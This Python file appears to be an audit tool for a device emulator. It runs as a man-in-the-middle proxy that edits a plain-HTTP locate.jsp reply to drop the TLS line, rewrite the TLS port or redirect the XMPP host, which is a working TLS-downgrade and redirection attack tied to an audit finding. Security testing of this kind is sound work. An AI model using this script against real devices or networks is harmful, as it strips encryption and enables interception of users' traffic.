"""An attacker on the path between a rabbit and its warren, for the emulator.

  python3 tools/locate_strip.py --listen 18080 --upstream 18733 [--tls-port N] [--host H]

Every HTTP request the rabbit makes is forwarded as it is; the answer to
locate.jsp comes back edited, as someone who owns the rabbit's gateway can
edit it, since locate.jsp is plain HTTP:

  default         the `xmpp_tls <port>` line is dropped: the rabbit is told
                  its warren offers no TLS (audit T6)
  --tls-port N    the TLS port is rewritten to N (the plain port, say)
  --host H        the host in `xmpp_domain` is rewritten to H

Point the rabbit's configuration page at --listen (mkconf.py --server
127.0.0.1:<listen>/vl); the warren's XMPP ports are reached directly, the
rabbit-vm gateway preserves ports.
"""
import argparse
import socket
import sys
import threading


def read_headers(sock):
    buf = b""
    while b"\r\n\r\n" not in buf and b"\n\n" not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf


def read_all(sock):
    out = b""
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            return out
        out += chunk


def edit_locate(body: bytes, args) -> bytes:
    lines = []
    for line in body.split(b"\n"):
        if line.startswith(b"xmpp_tls "):
            if args.tls_port is None:
                print("locate.jsp: dropped the line", line.decode(), flush=True)
                continue
            line = b"xmpp_tls %d" % args.tls_port
            print("locate.jsp: rewrote the TLS port to", args.tls_port, flush=True)
        if args.host and line.startswith(b"xmpp_domain "):
            hostport = line.split(b" ", 1)[1]
            port = hostport.rsplit(b":", 1)[1] if b":" in hostport else b""
            line = b"xmpp_domain " + args.host.encode() + (b":" + port if port else b"")
            print("locate.jsp: rewrote the host to", args.host, flush=True)
        lines.append(line)
    return b"\n".join(lines)


def serve(conn, args):
    try:
        req = read_headers(conn)
        if not req:
            return
        first = req.split(b"\n", 1)[0].decode(errors="replace").strip()
        up = socket.create_connection(("127.0.0.1", args.upstream), timeout=10)
        up.sendall(req)
        resp = read_all(up)
        up.close()
        if "locate.jsp" in first and b"\r\n\r\n" in resp:
            head, body = resp.split(b"\r\n\r\n", 1)
            body = edit_locate(body, args)
            lines = [l for l in head.split(b"\r\n") if not l.lower().startswith(b"content-length:")]
            lines.append(b"Content-Length: %d" % len(body))
            resp = b"\r\n".join(lines) + b"\r\n\r\n" + body
        print("forwarded", first, flush=True)
        conn.sendall(resp)
    except OSError as e:
        print("error:", e, flush=True)
    finally:
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        conn.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen", type=int, required=True)
    ap.add_argument("--upstream", type=int, required=True)
    ap.add_argument("--tls-port", type=int)
    ap.add_argument("--host")
    args = ap.parse_args()
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", args.listen))
    s.listen(16)
    print(f"locate_strip on 127.0.0.1:{args.listen} -> 127.0.0.1:{args.upstream}", flush=True)
    while True:
        conn, _ = s.accept()
        threading.Thread(target=serve, args=(conn, args), daemon=True).start()


if __name__ == "__main__":
    sys.exit(main())
